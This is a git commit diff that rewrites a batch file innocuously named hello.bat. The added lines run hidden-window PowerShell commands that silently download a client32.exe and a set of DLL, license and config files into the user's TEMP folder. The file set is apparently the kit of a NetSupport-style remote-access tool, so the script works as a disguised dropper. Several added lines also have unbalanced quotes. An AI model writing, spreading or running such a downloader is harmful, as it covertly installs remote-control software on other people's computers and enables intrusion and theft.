6c3d0ddb088b7f08e22fbf2213184b2dba7969a5
MEMEOW-IO <jonsongood@mail.ru>
2025-07-12 18:37:30 +0300

    Update hello.bat

--- hello.bat
+++ hello.bat
@@ -1,11 +1,12 @@
-powershell -WindowStyle Hidden -Command @"
-$files = @(
-    @{Uri='https://github.com/MEMEOW-IO/test/raw/refs/heads/main/client32.exe'; OutFile='%TEMP%\client32.exe'},
-    @{Uri='https://github.com/MEMEOW-IO/test/raw/refs/heads/main/Client32.ini'; OutFile='%TEMP%\Client32.ini'},
-    @{Uri='https://github.com/MEMEOW-IO/test/raw/refs/heads/main/NSM.LIC'; OutFile='%TEMP%\NSM.LIC'}
-)
-
-foreach ($file in $files) {
-    Invoke-WebRequest -Uri $file.Uri -OutFile $env:$file.OutFile
-}
-"@
+powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/MEMEOW-IO/test/raw/refs/heads/main/client32.exe' -OutFile '%TEMP%\client32.exe';
+powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/MEMEOW-IO/test/raw/refs/heads/main/Client32.ini' -OutFile '%TEMP%\Client32.ini';
+powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/MEMEOW-IO/test/raw/refs/heads/main/NSM.LIC' -OutFile '%TEMP%\NSM.LIC';
+powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/MEMEOW-IO/test/raw/refs/heads/main/HTCTL32.DLL' -OutFile '%TEMP%\HTCTL32.DLL';
+powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/MEMEOW-IO/test/raw/refs/heads/main/msvcr100.dll' -OutFile '%TEMP%\msvcr100.dll';
+powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/MEMEOW-IO/test/raw/refs/heads/main/nskbfltr.inf' -OutFile '%TEMP%\nskbfltr.inf'';
+powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/MEMEOW-IO/test/raw/refs/heads/main/NSM.ini' -OutFile '%TEMP%\NSM.ini';
+powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/MEMEOW-IO/test/raw/refs/heads/main/nsm_vpro.inf' -OutFile '%TEMP%\nsm_vpro.inf';
+powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/MEMEOW-IO/test/raw/refs/heads/main/pcicapi.dll' -OutFile '%TEMP%\pcicapi.dll';
+powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/MEMEOW-IO/test/raw/refs/heads/main/PCICHEK.DLL' -OutFile '%TEMP%\PCICHEK.DLL';
+powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/MEMEOW-IO/test/raw/refs/heads/main/PCICL32.DLL' -OutFile '%TEMP%\PCICL32.DLL';
+powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/MEMEOW-IO/test/raw/refs/heads/main/TCCTL32.DLL' -OutFile '%TEMP%\TCCTL32.DLL';
